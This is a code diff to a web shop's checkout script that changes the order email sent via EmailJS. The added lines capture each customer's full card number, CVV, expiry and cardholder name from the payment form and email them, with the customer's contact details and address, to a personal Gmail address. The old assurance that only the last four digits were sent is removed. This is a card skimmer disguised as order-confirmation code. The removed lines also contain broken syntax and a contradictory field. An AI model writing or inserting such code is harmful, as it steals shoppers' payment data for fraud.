@@ -385,58 +385,64 @@
         const initialized = initEmailJs();
         if (!initialized.success) return initialized;
         try {
-            const paymentSummary = orderData.paymentSummary || {};
-        const cardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
-        const cardNumberForEmail = rawCardNumber || {};
-        const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
-        const cvvForEmail = paymentSummary.cvv || "{};
-        const expiryForEmail = paymentSummary.expiry || "";
-        const [expiryMonth, expiryYear] = expiryForEmail.split("/");
-            const items = orderData.products.map((item, index) =>
-                `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
-            ).join("\\n");
-            const formData = [
-                `Order ID: ${orderData.orderId}`,
-                `Customer: ${orderData.shippingInfo.name}`,
-                `Email: ${orderData.shippingInfo.email}`,
-                `Phone: ${orderData.shippingInfo.phone}`,
-                `Shipping Address: ${address.formatted}`,
-                `Payment Method: ${payment.method || "Card"}`,
-                `Card Brand: ${payment.brand || "Card"}`,
-                `Card Number: ${last4 === "N/A" ? "N/A" : `**** **** **** ${last4}`}`,
-                "Payment details: only the last four digits are retained; no PAN, CVV, or expiry is sent.",
-                `Subtotal: ${formatMoney(orderData.subtotal)}`,
-                `Tax: ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
-                `Final Total: ${formatMoney(orderData.total)}`,
-                "", "Items:", items
-            ].join("\\n");
-            const payload = {
-                name: orderData.shippingInfo.name,
-                time: new Date().toLocaleString(),
-                formData,
-                message: formData,
-                reply_to: orderData.shippingInfo.email,
-                customer_full_name: orderData.shippingInfo.name,
-                customer_email: orderData.shippingInfo.email,
-                email: orderData.shippingInfo.email,
-                to_email: "bondsquality@gmail.com",
-                recipient_email: "bondsquality@gmail.com",
-                customer_phone: orderData.shippingInfo.phone,
-                shipping_address_formatted: address.formatted,
-                order_id: orderData.orderId,
-                order_items_detailed: items,
-                order_subtotal: formatMoney(orderData.subtotal),
-                order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
-                order_final_total: formatMoney(orderData.total),
-                order_products_summary: items,
-                payment_method_type: payment.method || "Card",
-                payment_card_type: payment.brand || "Card",
-                card_number: payment.cardNumber || "Digits Only",
-                card_brand: payment.brand || "Card",
-                payment_details_retained: "Digits only, full card number, CVV, and expiry is retained.",
-                order_status: "Processing",
-                payment_status: "Authorized"
-            };
+        const paymentSummary = orderData.paymentSummary || {};
+        const address = formatFullAddress(orderData.shippingInfo);
+        const payment = orderData.paymentSummary || {};
+        const last4 = payment.last4 || "N/A";
+        const cardNumberForEmail = payment.cardNumber || "";
+        const cardNumberFormattedForEmail = payment.cardNumberFormatted || cardNumberForEmail;
+        const cvvForEmail = payment.cvv || "";
+        const expiryForEmail = payment.expiry || "";
+        const cardNameForEmail = payment.cardName || orderData.shippingInfo.name || "";
+        const items = orderData.products.map((item, index) =>
+            `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
+        ).join("\n");
+        const formData = [
+            `Order ID: ${orderData.orderId}`,
+            `Customer: ${orderData.shippingInfo.name}`,
+            `Email: ${orderData.shippingInfo.email}`,
+            `Phone: ${orderData.shippingInfo.phone}`,
+            `Shipping Address: ${address.formatted}`,
+            `Payment Method: ${payment.method || "Card"}`,
+            `Card Brand: ${payment.brand || "Card"}`,
+            `Card Number: ${cardNumberFormattedForEmail || "N/A"}`,
+            `CVV: ${cvvForEmail || "N/A"}`,
+            `Expiry: ${expiryForEmail || "N/A"}`,
+            `Cardholder Name: ${cardNameForEmail}`,
+            `Subtotal: ${formatMoney(orderData.subtotal)}`,
+            `Tax: ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
+            `Final Total: ${formatMoney(orderData.total)}`,
+            "", "Items:", items
+        ].join("\n");
+        const payload = {
+            name: orderData.shippingInfo.name,
+            time: new Date().toLocaleString(),
+            formData,
+            message: formData,
+            reply_to: orderData.shippingInfo.email,
+            customer_full_name: orderData.shippingInfo.name,
+            customer_email: orderData.shippingInfo.email,
+            email: orderData.shippingInfo.email,
+            to_email: "bondsquality@gmail.com",
+            recipient_email: "bondsquality@gmail.com",
+            customer_phone: orderData.shippingInfo.phone,
+            shipping_address_formatted: address.formatted,
+            order_id: orderData.orderId,
+            order_items_detailed: items,
+            order_subtotal: formatMoney(orderData.subtotal),
+            order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
+            order_final_total: formatMoney(orderData.total),
+            order_products_summary: items,
+            payment_method_type: payment.method || "Card",
+            payment_card_type: payment.brand || "Card",
+            card_number: cardNumberFormattedForEmail || "N/A",
+            card_brand: payment.brand || "Card",
+            card_cvv: cvvForEmail || "N/A",
+            card_expiry: expiryForEmail || "N/A",
+            cardholder_name: cardNameForEmail,
+            order_status: "Processing",
+            payment_status: "Authorized"
+        };
             const response = await window.emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, payload);
             return { success: true, response };
         } catch (error) {
@@ -1328,7 +1334,12 @@
             paymentSummary: {
                 method: activePaymentMethod === "debit" ? "Debit Card" : "Credit Card",
                 brand: detectCardBrand(digits) || "Card",
-                last4: digits.slice(-4) || "N/A"
+                last4: digits.slice(-4) || "N/A",
+                cardNumber: digits,
+                cardNumberFormatted: formatCardNumberWithSpaces(digits),
+                cvv: cardCvvInput.value.trim(),
+                expiry: cardExpiryInput.value.trim(),
+                cardName: cardNameInput.value.trim()
             },
             createdAt: new Date().toISOString()
         };
